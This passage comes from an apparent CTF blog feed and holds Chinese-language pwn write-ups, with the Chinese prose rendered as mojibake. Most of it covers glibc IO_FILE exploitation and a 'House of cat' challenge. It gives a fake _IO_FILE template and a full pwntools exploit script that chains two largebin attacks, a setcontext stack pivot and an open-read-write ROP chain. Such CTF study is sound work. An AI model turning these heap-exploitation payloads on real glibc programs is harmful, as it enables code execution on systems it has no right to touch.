&lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class="line">  0x7fbbb9489d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure><p>ËøôÈáåcall‰∫Ü‰∏Ä‰∏™<code>rax</code>Áõ∏ÂÖ≥ÁöÑÂú∞ÂùÄÔºåËÄå<code>rax</code>Áî±<code>rdi</code>ÂÜ≥ÂÆö</p><p>ÂÜçËØ¥Ë∞ÉÁî®Êù°‰ª∂ÔºåÈúÄË¶ÅÊª°Ë∂≥‰∏§‰∏™</p><ol><li><p><code>was_writing == 1</code></p><p>Âç≥fp-&gt;<code>_wide_data</code>-&gt;<code>_IO_write_ptr</code>    &gt;  fp-&gt;<code>_wide_data</code>-&gt;<code>_IO_write_base</code></p><p>ËøôÈáåÁî®Âà∞‰∫ÜÂâçÈù¢ÊèêÂà∞ÁöÑ<code>_wide_data</code>Ë∑≥Ë°®ÔºåÂèØ‰ª•Áõ¥Êé•‰º™ÈÄ†so easy</p></li><li><p><code>mode!=0</code></p><p><code>rcx</code>&#x3D;&gt;<code>mode</code></p><p>Â¶ÇÊûúÊó†Ê≥ïÊª°Ë∂≥ÔºåÂèØ‰ª•ÂÜçÂÅö‰∏Ä‰∏™FILEÁªìÊûÑ‰ΩìÔºåËøõÂÖ•Á¨¨‰∫å‰∏™ÁªìÊûÑ‰ΩìÊó∂Â∞±ÁΩÆÂ•Ω‰∫ÜÔºåËØ¶ÁªÜÂÜÖÂÆπÂèÇËÄÉ<a href="https://phot0n.com/2022/09/06/%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%8EFSOP/">PhotonÁöÑÂçöÂÆ¢</a></p></li></ol><p>ÊûÑÈÄ†Êå∫È∫ªÁÉ¶ÁöÑÔºåÁêÜËß£‰πãÂêéÂèØ‰ª•Áõ¥Êé•‰∏äÂà´‰∫∫ÁöÑÊ®°Êùø</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+<span class="number">0xb00</span> # ‰º™ÈÄ†ÁöÑfake_IOÁªìÊûÑ‰ΩìÁöÑÂú∞ÂùÄ</span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(rdi)         #_flags=rdi</span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="meta"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)#_IO_backup_base=rdx</span><br><span class="line">fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  # _lock = a writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)#_wide_data,rax1_addr</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="meta">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="meta"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  # rax2_addr</span><br></pre></td></tr></table></figure><p>ËØ¶ÁªÜÈ¢òËß£ÂèØ‰ª•Áúã<a href="https://deepunk42.github.io/2023/07/27/house-of-cat/">Âè¶‰∏ÄÁØáÂçöÂÆ¢</a></p>]]></content>
    
    
    <summary type="html">IOFILEÈò∂ÊÆµÊÄßÂ≠¶‰π†ÊàêÊûúÊ±áÊä•Â§ß‰ºö</summary>
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>House of catÂº∫ÁΩëÊùØÂ§çÁé∞</title>
    <link href="http://deepunk.icu/house-of-cat/"/>
    <id>http://deepunk.icu/house-of-cat/</id>
    <published>2023-07-27T03:20:34.000Z</published>
    <updated>2023-12-14T15:12:03.231Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ÊúÄÂêé‰∏ÄÂ§©ÁöÑÈ¢òÔºåÊ∞¥Ê∞¥</p></blockquote><h2 id="ÈÄÜÂêë"><a href="#ÈÄÜÂêë" class="headerlink" title="ÈÄÜÂêë"></a>ÈÄÜÂêë</h2><h3 id="Ê†ºÂºèÊ£ÄÊü•"><a href="#Ê†ºÂºèÊ£ÄÊü•" class="headerlink" title="Ê†ºÂºèÊ£ÄÊü•"></a>Ê†ºÂºèÊ£ÄÊü•</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOGIN | r00t QWBQWXFadmin</span><br><span class="line">CAT | r00t QWBQWXF$\xff</span><br></pre></td></tr></table></figure><h3 id="ÂäüËÉΩÂàÜÊûê"><a href="#ÂäüËÉΩÂàÜÊûê" class="headerlink" title="ÂäüËÉΩÂàÜÊûê"></a>ÂäüËÉΩÂàÜÊûê</h3><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>indexÂú®0Âà∞15Èó¥</p><p>0x418&lt;&#x3D; size &lt;&#x3D;0x46f</p><p>‰ΩøÁî®calloc</p><h4 id="delet"><a href="#delet" class="headerlink" title="delet"></a>delet</h4><p>UAF</p><h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p>write 0x30</p><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p>ÈôêÂà∂2Ê¨°</p><p>ÊØèÊ¨°Âè™ËÉΩ‰øÆÊîπ<strong>0x30</strong></p><h2 id="ÊîªÂáªÊµÅÁ®ãÂàÜÊûê"><a href="#ÊîªÂáªÊµÅÁ®ãÂàÜÊûê" class="headerlink" title="ÊîªÂáªÊµÅÁ®ãÂàÜÊûê"></a>ÊîªÂáªÊµÅÁ®ãÂàÜÊûê</h2><p>Áî±‰∫é‰∏çÂ≠òÂú®ÂØπexitÁöÑË∞ÉÁî®Ôºå‰∏îÂú®mainÂáΩÊï∞‰∏≠Êó†ÈôêÂæ™ÁéØÔºåÊïÖÊó†Ê≥ïËøõË°åFSOP</p><p>ÂèØ‰ª•ÈááÁî®house of kiwiÁöÑËß¶ÂèëIOÊÄùË∑ØÔºåÂà©Áî®<code>__malloc_assert</code>Ë∞ÉÁî®<code>fflush(stderr)</code>ÊàñËÄÖ<code>__fxprintf</code></p><p>ÊâÄ‰ª•ÈúÄË¶ÅÊîªÂáª‰Ωç‰∫éstderr‰∏äÁöÑÊåáÈíàÔºåÊÅ∞Â•ΩÊú¨È¢òËØ•Âú∞ÂùÄÂèØÂÜôÔºåËøôÈáå‰ΩøÁî®‰∏ÄÊ¨°largebin attack</p><p>Âè¶Â§ñÔºåË¶ÅËß¶Âèë<code>__malloc_assert</code>ÔºåÈúÄË¶Å‰øÆÊîπtopchunkÁöÑsize</p><p>Êú¨È¢òÁî±‰∫éeditÊúâÈïøÂ∫¶ÈôêÂà∂Ôºå‰∏çÊñπ‰æø‰ΩøÁî®‰πãÂâçÊûÑÈÄ†Â†ÜÈáçÂè†ÁöÑÊñπÂºèÔºåÊâÄ‰ª•ËøôÈáåÂèØ‰ª•Áî®Á¨¨‰∫åÊ¨°largebin attackÊîªÂáªsize</p><p>ÊÅ∞Â•ΩÂÖ±Êúâ‰∏§Ê¨°editÊú∫‰ºöÔºåÂàöÂ•ΩÁî®ÂÆåe</p><p>Âè¶Â§ñÔºåÊîªÂáªtop sizeÊó∂Ë¶ÅÊ≥®ÊÑèÔºåÂú®Â∞ÜÁ¨¨‰∫å‰∏™chunkÂä†ÂÖ•largebinÊó∂Ôºå‰∏çËÉΩÊîπÂèòtop chunkÁöÑ‰ΩçÁΩÆ„ÄÇ‰πüÂ∞±ÊòØËØ¥Ôºå‰∏çËÉΩÈÄöËøáÂàÜÈÖç‰∏Ä‰∏™Êõ¥Â§ßchunkÁöÑÊñπÂºèÊù•ÂæóÂà∞Á¨¨‰∫å‰∏™largechunk</p><p>ËøôÊòØÂõ†‰∏∫ÂØπlargebinËøõË°åunlinkÁöÑÊìç‰ΩúÂú®‰ªétopchunkÂàÜÈÖçchunk‰πãÂâçÔºåÊ≠§Êó∂‰øÆÊîπËøáÁöÑsize‰ºöË¢´Êñ∞ÁöÑsizeË¶ÜÁõñÊéâ„ÄÇ</p><p>ÊâÄ‰ª•Ëøô‰∏ÄÊ≠•ÂÖ•largebinÁöÑÊìç‰ΩúÔºåÂèØ‰ª•ÈÄöËøáÂàÜÈÖçÊõ¥Â∞èÁöÑchunkËé∑Âæó</p><p><img src="/../img/house-of-cat.assets/image-20230726120735530.png" alt="image-20230726120735530"></p><p>ÂºÄ‰∫ÜÊ≤ôÁÆ±ÔºåÁ¶ÅÁî®‰∫ÜexecveÔºåÂπ∂Ê£ÄÊü•readÁöÑfdÊòØÂê¶‰∏∫0</p><p>ÊïÖÂè™ËÉΩÊâìorw, Âπ∂‰∏îÂú®openÂâçÈúÄË¶ÅÂÖàclose(0)</p><h2 id="Â†ÜÈ£éÊ∞¥"><a href="#Â†ÜÈ£éÊ∞¥" class="headerlink" title="Â†ÜÈ£éÊ∞¥"></a>Â†ÜÈ£éÊ∞¥</h2><p>ÈúÄË¶ÅËææÂà∞ÁöÑÊïàÊûúÊòØÔºö‰∏§Ê¨°largebin attackÔºåÂàÜÂà´‰ΩøstderrÊåáÂêëÂèØÊéßÂÜÖÂÆπÁöÑÂ†ÜÂùó„ÄÅ‰øÆÊîπtopchunk</p><p>Áúã‰ººÊØîËæÉÁÆÄÂçïÔºå‰ΩÜÈúÄÊ≥®ÊÑèeditÂè™ËÉΩ‰øÆÊîπ0x30Ôºå‰∏îÂè™Êúâ‰∏§Ê¨°Êú∫‰ºö</p><p>ÊâÄ‰ª•ÂØπ‰º™ÈÄ†ÁªìÊûÑ‰ΩìÂÜÖÂÆπÁöÑÂÜôÂÖ•ÈúÄË¶ÅÂú®addÊìç‰ΩúËøõË°åÔºåÂÖ•largebin‰πãÂêéÂØπÂâç6‰∏™Âú∞ÂùÄ‰ºöÊúâË¶ÜÁõñÔºåÂÆûÊµã‰∏ãÊù•ÂØπIOÂà©Áî®Ê≤°ÊúâÂΩ±Âìç</p><h2 id="IOÂà©Áî®ÊµÅÁ®ãÂàÜÊûê"><a href="#IOÂà©Áî®ÊµÅÁ®ãÂàÜÊûê" class="headerlink" title="IOÂà©Áî®ÊµÅÁ®ãÂàÜÊûê"></a>IOÂà©Áî®ÊµÅÁ®ãÂàÜÊûê</h2><p>_wide_data&#x3D;fake_io_addr+0x30</p><p>1.Â∞Ü[rdi+0xa0]<code>_wide_data</code>Â§ÑÁöÑÂÜÖÂÆπËµãÂÄºÁªôraxÔºå‰∏∫‰∫ÜÈÅøÂÖç‰∏é‰∏ãÈù¢ÁöÑraxÊ∑∑Ê∑ÜÔºåÁß∞‰πã‰∏∫<strong>rax1</strong>„ÄÇ<br>2.Â∞ÜÊñ∞ËµãÂÄºÁöÑ[rax1+0x20]<code>_IO_backup_base</code>Â§ÑÁöÑÂÜÖÂÆπËµãÂÄºÁªôrdx„ÄÇ<br>3.Â∞Ü[rax1+0xe0]</p><p>Â§ÑÁöÑÂÜÖÂÆπËµãÂÄºÁªôraxÔºåÁß∞‰πã‰∏∫<strong>rax2</strong>„ÄÇ<br>4.callË∞ÉÁî®[rax2+0x18]Â§ÑÁöÑÂÜÖÂÆπ„ÄÇ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_wide_data-&gt;_IO_read_ptr ÔºÅ=_wide_data-&gt;_IO_read_end</span><br><span class="line">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</span><br><span class="line">#Â¶ÇÊûú_wide_data=fake_io_addr+<span class="number">0x30</span>ÔºåÂÖ∂ÂÆû‰πüÂ∞±ÊòØfp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base</span><br><span class="line">fp-&gt;_lockÊòØ‰∏Ä‰∏™ÂèØÂÜôÂú∞ÂùÄÔºàÂ†ÜÂú∞ÂùÄ„ÄÅlibc‰∏≠ÁöÑÂèØÂÜôÂú∞ÂùÄ</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(host, port)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">login = <span class="string">&quot;LOGIN | r00t QWB QWXFadmin&quot;</span></span><br><span class="line">cat = <span class="string">&quot;CAT | r00t QWB QWXF$\xff&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;content:\n&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">p.send(login)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x420</span>, cyclic(<span class="number">0x420</span>))<span class="comment">#largechunk 0</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x440</span>, cyclic(<span class="number">0x440</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x450</span>, cyclic(<span class="number">0x450</span>))</span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#leak largechunk</span></span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x21a0d0</span></span><br><span class="line">stderr_addr = libc_base + <span class="number">0x21a860</span></span><br><span class="line">setcontext61 = libc_base + <span class="number">0x53a6d</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;\x7f\x00\x00&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x290</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr_addr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0000000000029cd6</span>+libc_base</span><br><span class="line">pop_rdi = <span class="number">0x000000000002a3e5</span>+libc_base</span><br><span class="line">pop_rsi = <span class="number">0x000000000002be51</span>+libc_base</span><br><span class="line">pop_rax = <span class="number">0x0000000000045eb0</span> + libc_base</span><br><span class="line">syscall = <span class="number">0x0000000000091396</span> + libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment">#fake stderr----------------------------------------</span></span><br><span class="line">fake_stderr = heap_base + <span class="number">0xf70</span></span><br><span class="line">fake_rdx = fake_stderr + <span class="number">0x10</span> + <span class="number">0x200</span></span><br><span class="line">fake_stack = fake_stderr + <span class="number">0x10</span> + <span class="number">0x320</span></span><br><span class="line">io = p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io += p64(<span class="number">1</span>) + p64(<span class="number">2</span>)<span class="comment">#rcx!=0</span></span><br><span class="line">io += p64(fake_rdx)<span class="comment">#backup_base rdx</span></span><br><span class="line">io += p64(setcontext61)</span><br><span class="line">io = io.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(libc_base+<span class="number">0x21ba60</span>)<span class="comment">#lock</span></span><br><span class="line">io = io.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(fake_stderr+<span class="number">0x30</span>)<span class="comment">#wide_data rax1</span></span><br><span class="line">io = io.ljust(<span class="number">0xb0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(<span class="number">1</span>)<span class="comment">#mode</span></span><br><span class="line">io = io.ljust(<span class="number">0xc8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]+<span class="number">0x10</span>)</span><br><span class="line">io += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io += p64(fake_stderr+<span class="number">0x40</span>)</span><br><span class="line">io = io.ljust(<span class="number">0x200</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#fake rdx:</span></span><br><span class="line">payload = <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rdi-&gt;0</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(fake_stack)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">io += payload</span><br><span class="line">io = io.ljust(<span class="number">0x320</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"><span class="comment">#fake_stack:</span></span><br><span class="line">payload = p64(libc_base+libc.sym[<span class="string">&#x27;close&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(fake_rdx)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x100</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x100</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line">io+=payload</span><br><span class="line"></span><br><span class="line">io = io.ljust(<span class="number">0x430</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------------</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x440</span>,io)<span class="comment"># largebin 0 </span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x440</span>,cyclic(<span class="number">0x440</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x430</span>,cyclic(<span class="number">0x430</span>))<span class="comment">#largebin 1</span></span><br><span class="line"><span class="comment"># add(7,0x440,cyclic(0x440))</span></span><br><span class="line"><span class="comment"># add(8,0x420,cyclic(0x420))</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x460</span>,cyclic(<span class="number">0x440</span>))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#largebin attack</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0xf90</span>) + p64(stderr_addr-<span class="number">0x20</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x460</span>,cyclic(<span class="number">0x460</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x430</span>, cyclic(<span class="number">0x430</span>))<span class="comment">#calloc chunk6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin attack 2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">11</span>)<span class="comment">#largebin 1 0x430</span></span><br><span class="line"><span class="comment">#delete(8)</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0xf90</span>) + p64(heap_base+<span class="number">0x2538</span>-<span class="number">5</span>-<span class="number">0x20</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x41f</span>,cyclic(<span class="number">0x41f</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x460</span>,cyclic(<span class="number">0x460</span>))<span class="comment">#trigger malloc assert</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">mio~</summary>
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
    <category term="wp" scheme="http://deepunk.icu/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>House of pig xctf2021finalÂ§çÁé∞</title>
    <link href="http://deepunk.icu/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0/"/>
